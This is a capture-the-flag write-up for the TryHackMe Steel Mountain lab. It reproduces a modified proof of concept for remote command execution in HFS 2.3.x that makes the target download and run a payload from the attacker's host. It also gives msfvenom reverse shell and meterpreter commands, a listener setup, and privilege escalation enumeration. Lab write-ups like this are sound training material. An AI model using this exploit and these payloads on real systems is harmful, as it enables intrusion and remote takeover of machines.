# Steel Mountain

{% embed url="https://tryhackme.com/room/steelmountain" %}

{% embed url="https://05t3.github.io/posts/Steel-Mountain/" %}

{% embed url="https://medium.com/@weifeng.c01/tryhackme-ctf-steel-mountain-1ac394c030dd" %}

{% embed url="https://blog.razrsec.uk/steel-mountain-walkthrough/" %}

### Initial access

...

#### Retrieving shell (without metasploit)

_**Modified PoC**_

{% embed url="https://www.exploit-db.com/exploits/39161" %}

{% code title="39161.py" overflow="wrap" %}
```python
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
 
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!


import urllib2
import sys

try:
	def script_create():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	ip_addr = "xxx.xxx.xxx.xxx" #local IP address
	local_port = "8888" # Local Port number
	
	rev_shell_payload_port = "xxxx" # replace with the port number to serve the payload (on the address identified by the "ip_addr" variable declared above)
	rev_shell_payload = "xxxx" # refer below
	
	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%3A"+rev_shell_payload_port+"%2F"+rev_shell_payload+"%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5C"+rev_shell_payload+"%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2

	# vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	vbs3 = "C%3A%5CUsers%5CPublic%5C"+rev_shell_payload

	exe1= "exec|"+vbs3
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""
	
            
```
{% endcode %}

{% code title="Execute the script (Python 2)" overflow="wrap" %}
```sh
$ python2 39161.py <target> <port>
```
{% endcode %}

Note that we have to replace the `rev_shell_payload` variable in the script above, to the name of the generated payload from **msfvenom**, wit the `.exe` or `.cmd` extensions.

> In general, the generated payloads by msfvenom (refer below) with the `.exe` works to provide us with a shell. However, a payload with `.cmd` may not work as expected.

_**Windows reverse TCP payload**_

{% code overflow="wrap" %}
```sh
$ msfvenom -p windows/shell/reverse_tcp LHOST=<attacker_addr> LPORT=8888 -f exe -o <output>.exe
```
{% endcode %}

_**Windows (Powershell) reverse TCP payload**_

{% code overflow="wrap" %}
```sh
$ msfvenom -p cmd/windows/powershell/powershell_reverse_tcp LHOST=<attacker_addr> LPORT=8888 -o <output>.cmd
```
{% endcode %}

_**meterpreter payload**_

{% code overflow="wrap" %}
```sh
$ msfvenom -p windows/x64/meterpreter_reverse_tcp -f exe LHOST=10.4.10.179 LPORT=8888 -o <output>.exe
```
{% endcode %}

{% code title="host web server to load payload file" overflow="wrap" %}
```sh
$ python3 -m http.server <port> # the value of <port> should match the "rev_shell_payload_port" variable in the script
```
{% endcode %}

#### Catch shell/meterpreter&#x20;

```sh
msf6> use multi/handler
msf6> set payload xxxx
msf6> set lhost xxxx
msf6> set lport xxxx

msf6> run
```

### Privilege escalation

#### Enumeration

1. PowerUp.ps1 (PowerSploit)

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" %}

2. WinPEAS

{% embed url="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS" %}

After enumeration, we discover that there is a particular service named **AdvancedSystemCareService9** with an unquoted service path, and the `CanRestart` parameter set to **True**. We can use various tools to discover the name of the vulnerable service.

#### Getting more information about services

{% code overflow="wrap" %}
```powershell
PS> Get-Service *
PS> Get-CimInstance Win32_Service -Filter *
PS> sc qc <servicename>
```
{% endcode %}

```powershell
C:\> icacls C:\
C:\> icacls "C:\Program Files.exe"
C:\> icacls "C:\Program Files (x86)\IObit"
C:\> icacls "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

Now, we can exploit the found service. Refer to the write-up below for more information:

{% embed url="https://medium.com/@weifeng.c01/tryhackme-ctf-steel-mountain-1ac394c030dd" %}
